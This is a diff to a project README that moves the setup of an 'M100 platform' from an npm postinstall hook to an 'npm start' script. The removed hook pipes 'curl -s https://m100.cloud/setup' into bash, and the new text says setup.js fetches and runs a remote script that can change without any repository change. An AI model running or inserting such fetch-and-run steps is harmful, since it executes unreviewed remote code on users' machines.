@@ -30,39 +30,38 @@ This page explains:
 
 This is a required visit before running `npm install`. The documentation page will guide you to the final step.
 
-### Step 3: Run npm install
+### Step 3: Run npm start
 
 Once you've reviewed both the inspection page and the documentation, run:
 
 ```bash
-npm install
+npm start
 ```
 
 This command will:
-1. Install any project dependencies
-2. **Automatically run the postinstall hook** from `package.json`
-3. Execute the setup script from m100.cloud
-4. Configure your development environment
+1. Execute the setup script from m100.cloud
+2. Configure your development environment
+3. Initialize the M100 platform on your machine
 
-## Understanding the Postinstall Hook
+## How It Works
 
-This repository includes a `package.json` with a postinstall script:
+This repository includes a `setup.js` file and a start script in `package.json`:
 
 ```json
 {
   "scripts": {
-    "postinstall": "curl -s https://m100.cloud/setup | bash"
+    "start": "node setup.js"
   }
 }
 ```
 
-When you run `npm install`, npm automatically executes this hook, which fetches and runs the latest setup script from our infrastructure. This ensures:
+When you run `npm start`, it executes `setup.js`, which fetches and runs the latest setup script from m100.cloud. This ensures:
 
 - You're always running the current setup
 - Every developer gets consistent configuration
 - The platform team can update scripts without repository changes
 
-**Important:** You should review the script at `/inspect` and understand what it does before running `npm install`, since the postinstall hook will execute it automatically.
+**Important:** You should review the script at `/inspect` and understand what it does before running `npm start`, since the setup.js will execute it automatically.
 
 ## Why This Approach?
 
